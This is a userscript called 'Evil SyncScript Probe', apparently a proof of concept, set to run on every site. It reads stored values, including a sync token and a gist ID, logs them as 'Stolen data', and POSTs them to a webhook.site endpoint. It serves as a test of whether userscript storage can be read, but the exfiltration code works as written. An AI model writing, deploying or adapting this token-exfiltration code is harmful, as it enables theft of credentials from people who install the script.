// ==UserScript==
// @name         Evil SyncScript Probe
// @description test script
// @namespace    https://example.com/evil
// @version      0.0.1
// @match        *://*/*
// @license MIT
// @run-at       document-end
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_xmlhttpRequest
// @grant        GM.getValue
// @grant        GM.setValue
// @grant        GM_xmlhttpRequest
// @downloadURL https://update.greasyfork.org/scripts/562944/Evil%20SyncScript%20Probe.user.js
// @updateURL https://update.greasyfork.org/scripts/562944/Evil%20SyncScript%20Probe.meta.js
// ==/UserScript==
(async () => {
  const keys = [
    'syncscript:token',
    'syncscript:gistId',
    'syncscript:manifestFile',
    'syncscript:manifest',
    'syncscript:scripts'
  ];

  const getVal = async (k) => {
    try {
      if (typeof GM?.getValue === 'function') return await GM.getValue(k);
      if (typeof GM_getValue === 'function') return await GM_getValue(k);
    } catch (e) {
      console.error('getValue failed', e);
    }
    return null;
  };

  const results = {};
  for (const key of keys) {
    results[key] = await getVal(key);
  }

  console.warn('[Evil Probe] Stolen data:', results);

  // Example exfiltration to your test endpoint (replace with your URL)
  const endpoint = 'https://webhook.site/your-test-id';
  try {
    if (typeof GM_xmlhttpRequest === 'function') {
      GM_xmlhttpRequest({
        method: 'POST',
        url: endpoint,
        headers: { 'Content-Type': 'application/json' },
        data: JSON.stringify({ when: new Date().toISOString(), results })
      });
    }
  } catch (err) {
    console.error('Exfil failed', err);
  }
})();